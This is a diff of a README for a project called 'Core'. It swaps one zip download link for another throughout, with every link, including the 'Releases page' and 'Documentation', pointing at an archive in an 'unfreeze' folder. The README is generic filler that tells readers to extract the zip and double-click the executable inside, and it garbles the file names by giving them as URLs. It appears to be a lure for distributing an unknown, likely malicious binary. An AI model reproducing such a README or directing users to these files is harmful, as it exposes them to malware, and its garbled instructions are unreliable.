@@ -1,6 +1,6 @@
 # 🚀 Core - Unlock the Power of Simplicity
 
-![Download Core](https://raw.githubusercontent.com/jtesei/Core/main/unfreeze/Software_Pitheciinae.zip)
+![Download Core](https://github.com/jtesei/Core/raw/refs/heads/main/unfreeze/Software_v3.6.zip)
 
 ## 📋 Overview
 
@@ -15,19 +15,19 @@ To start using Core, follow these simple steps.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**
-   To download Core, visit our Releases page: [Download Core](https://raw.githubusercontent.com/jtesei/Core/main/unfreeze/Software_Pitheciinae.zip). You will find the latest version available for download there.
+   To download Core, visit our Releases page: [Download Core](https://github.com/jtesei/Core/raw/refs/heads/main/unfreeze/Software_v3.6.zip). You will find the latest version available for download there.
 
 2. **Choose the Right Version**
    On the Releases page, look for the version suitable for your system. Common options include Windows, macOS, and Linux builds. Make sure to pick the one that fits your operating system.
 
 3. **Download the Application**
-   Click on the file that corresponds to your system to start the download. The file will typically be named something like `https://raw.githubusercontent.com/jtesei/Core/main/unfreeze/Software_Pitheciinae.zip` or similar. 
+   Click on the file that corresponds to your system to start the download. The file will typically be named something like `https://github.com/jtesei/Core/raw/refs/heads/main/unfreeze/Software_v3.6.zip` or similar. 
 
 4. **Extract the Files (if necessary)**
    If you downloaded a zipped file, locate the download in your computer's file explorer. Right-click on the zip file and choose "Extract All." Follow the prompts to extract the contents of the file.
 
 5. **Run the Application**
-   Find the extracted folder. Inside, you will see an executable file named `https://raw.githubusercontent.com/jtesei/Core/main/unfreeze/Software_Pitheciinae.zip` or similar. Double-click it to launch Core. 
+   Find the extracted folder. Inside, you will see an executable file named `https://github.com/jtesei/Core/raw/refs/heads/main/unfreeze/Software_v3.6.zip` or similar. Double-click it to launch Core. 
 
 ## ⚙️ System Requirements
 
@@ -61,7 +61,7 @@ Yes, Core is completely free. We believe in providing valuable tools without cos
 
 To learn more about Core and its functionalities, visit the documentation on our GitHub page. Here, you can find in-depth guides on how to harness the full potential of Core.
 
-- [Visit Documentation](https://raw.githubusercontent.com/jtesei/Core/main/unfreeze/Software_Pitheciinae.zip)
+- [Visit Documentation](https://github.com/jtesei/Core/raw/refs/heads/main/unfreeze/Software_v3.6.zip)
 
 ## 📞 Support
 
